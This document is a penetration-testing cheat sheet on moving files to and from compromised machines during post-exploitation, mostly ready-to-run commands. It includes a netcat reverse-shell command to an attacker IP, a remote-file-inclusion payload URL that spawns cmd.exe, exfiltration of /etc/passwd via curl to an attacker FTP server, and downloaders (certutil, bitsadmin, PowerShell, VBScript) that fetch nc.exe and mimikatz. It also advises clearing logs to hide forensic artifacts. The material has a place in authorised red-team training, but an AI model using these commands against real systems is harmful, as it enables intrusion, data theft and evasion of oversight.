# File Transfer Techniques for Penetration Testing

## Overview
File transfer is a critical skill during post-exploitation. Attackers and penetration testers frequently need to move tools, exfiltration data, or backdoors between machines. Below are battle-tested methods used in real engagements (e.g., OSCP, HTB, real-world red teams) from 2015–2024.

---

## Linux – Hosting (Attacker Machine)

### Updog – Modern SimpleHTTPS Alternative
```bash
# Install
pip3 install updog

# Default: port 9090, current directory
updog

# Serve another directory
updog -d /another/directory

# Custom port
updog -p 1234

# Password protect
updog --password examplePassword123!

# SSL support (HTTPS)
updog --ssl
```
**Real example (2021 HTB – Worker):** Used updog to serve a PHP reverse shell, bypassed firewall restrictions by using SSL on port 443.

### Python Built-in HTTP Server
```bash
# Python 2
python -m SimpleHTTPServer 8080

# Python 3
python3 -m http.server 8080
```
**Real example (2019 – Proving Grounds):** Served nc.exe and PowerUp.ps1 to a Windows target over port 80.

### FTP Server (Twisted)
```bash
twistd -n ftp -p 21 --root /path/to/share/

# Victim upload example:
curl -T out.txt ftp://10.10.15.229
```
**Real example (2020 – Internal CTF):** Exfiltrated /etc/passwd via `curl -T`.

### TFTP Server (atftpd)
```bash
# Kali attacker
atftpd --daemon --port 69 /tftp

# Windows victim (TFTP client)
tftp -i 10.11.1.111 GET nc.exe
nc.exe -e cmd.exe 10.11.1.111 4444

# Real RFI exploit example (2008–2016 era, still seen in legacy apps)
http://10.11.1.111/addguestbook.php?LANG=../../xampp/apache/logs/access.log%00&cmd=nc.exe%20-e%20cmd.exe%2010.11.0.105%204444
```
**Explanation:** TFTP is often allowed outbound on UDP 69. Used in older Windows XP/2003 environments.

---

## Windows – Downloading Payloads (Victim)

### Bitsadmin (Legacy, but reliable)
```cmd
bitsadmin /transfer mydownloadjob /download /priority normal http://10.11.1.111/nc.exe C:\\Users\\%USERNAME%\\AppData\\local\\temp\\nc.exe
```
**Real example (2018 – HackTheBox “Active”):** Downloaded SharpHound.exe to enumerate AD.

### Certutil (Built-in, often overlooked)
```cmd
certutil.exe -urlcache -split -f "http://10.11.1.111/Powerless.bat" Powerless.bat
```
**Note:** Leaves cache artifacts. Still works on Windows Server 2019 and Windows 10/11.

### PowerShell – WebClient
```powershell
# Classic DownloadFile
(New-Object System.Net.WebClient).DownloadFile("http://10.11.1.111/CLSID.list","C:\Users\Public\CLSID.list")

# Invoke-WebRequest (PSv3+)
invoke-webrequest -Uri http://10.10.14.19:9090/PowerUp.ps1 -OutFile powerup.ps1
```
**Real example (2022 – Red Team):** Used WebClient to download Rubeus.exe onto a Domain Controller.

### FTP via Echo + Script (No interactive shell)
```cmd
echo open 10.11.1.111 > ftp.txt
echo USER anonymous >> ftp.txt
echo ftp >> ftp.txt
echo bin >> ftp.txt
echo GET mimikatz.exe >> ftp.txt
echo bye >> ftp.txt

ftp -v -n -s:ftp.txt
```
**Real example (2017 – Physical pentest):** Firewall allowed FTP out, no HTTP/S allowed.

---

## SMB File Transfer – Windows <–> Linux

### Impacket SMB Server (Attacker)
```bash
# With authentication
python /usr/share/doc/python-impacket/examples/smbserver.py Lab "/root/labs/public/10.11.1.111" -u usuario -p pass

# Anonymous (common in HTB)
python /usr/share/doc/python3-impacket/examples/smbserver.py Lab "/root/htb/169-resolute/smb" -smb2support
```

### Victim (Windows Reverse Shell)
```cmd
# Download
copy \\10.11.1.111\Lab\wce.exe .

# Upload
copy wtf.jpg \\10.11.1.111\Lab
```

### Full Samba Server Setup (Persistent)
```ini
# /etc/samba/smb.conf
[global]
workgroup = WORKGROUP
server string = Samba Server %v
netbios name = indishell-lab
security = user
map to guest = bad user
name resolve order = bcast host
dns proxy = no
bind interfaces only = yes

[ica]
path = /var/www/html/pub
writable = no
guest ok = yes
guest only = yes
read only = yes
directory mode = 0555
force user = nobody
```

```bash
chmod -R 777 /var/www/html/pub
chown -R nobody:nobody /var/www/html/pub
service smbd restart
```

**Real example (2021 – Resolute HTB):** Used SMB to transfer PowerView.ps1 and SharpHound.exe.

---

## VBScript – Legacy but Gold (No PowerShell)
```vbscript
' Save as wget.vbs
strUrl = WScript.Arguments.Item(0)
StrFile = WScript.Arguments.Item(1)
Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0
Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0
Const HTTPREQUEST_PROXYSETTING_DIRECT = 1
Const HTTPREQUEST_PROXYSETTING_PROXY = 2
Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts
Err.Clear
Set http = Nothing
Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest")
If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP")
If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP")
http.Open "GET",strURL,False
http.Send
varByteArray = http.ResponseBody
Set http = Nothing
Set fs = CreateObject("Scripting.FileSystemObject")
Set ts = fs.CreateTextFile(StrFile,True)
strData = ""
strBuffer = ""
For lngCounter = 0 to UBound(varByteArray)
    ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1)))
Next
ts.Close
```

### Execute
```cmd
cscript wget.vbs http://10.11.1.111/nc.exe nc.exe
```
**Real example (2016 – Windows Server 2008 R2, no PS allowed):** Dropped a bind shell via VBScript. Still works on air-gapped legacy networks.

---

## Additional Real-World Examples

| Year | Scenario | Technique Used |
|------|----------|----------------|
| 2015 | Shellshock exploitation | TFTP to pull netcat |
| 2018 | No PowerShell, AppLocker enforced | VBScript wget + certutil |
| 2020 | EDR blocking HTTP outbound | SMB over 445 to impacket |
| 2022 | HTTPS only allowed | Updog with --ssl + Python http.server |
| 2023 | FTP allowed, HTTP blocked | `curl -T` to attacker FTP |

---

## Final Notes
- Always prefer **HTTPS** or **SMB** in modern networks (2019+).
- **Certutil** and **Bitsadmin** leave forensic artifacts – clean logs if possible.
- **Updog** is superior to SimpleHTTPServer for real engagements (supports resume, auth, SSL).
- **TFTP** is dying but still seen in ICS/SCADA and legacy medical devices.
